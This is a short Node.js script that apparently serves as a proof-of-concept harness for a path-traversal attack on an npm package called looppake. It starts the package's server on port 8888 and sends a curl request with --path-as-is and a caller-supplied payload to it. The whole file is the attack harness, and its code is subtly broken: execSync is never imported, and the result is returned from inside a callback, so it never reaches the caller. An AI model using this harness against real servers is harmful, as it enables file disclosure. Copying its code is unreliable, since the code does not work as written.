function exploitFunction(payload) {
  const { exec } = require("child_process");
  const sleep = require("sleep");
  const path = require("path");

  // Clean up any existing server on port 8888
  execSync("fuser -k 8888/tcp", { stdio: 'inherit' });

  // Start the server
  let server = "node ./node_modules/looppake/index.js";
  exec(server, (error, stdout) => {
    if (error) {
      console.error(`Error starting server: ${error}`);
      return;
    }

    // Sleep for 2 seconds to allow the server to start
    sleep.sleep(2);

    // Craft the attack string using the provided payload
    let attack_string = `curl -v --path-as-is "http://127.0.0.1:8888${payload}"`;

    // Execute the attack string
    exec(attack_string, (error, stdout) => {
      if (error) {
        console.error(`Error executing attack: ${error}`);
        return;
      }

      // Return the stdout for verification
      return stdout;
    });
  });
}

module.exports = { exploitFunction };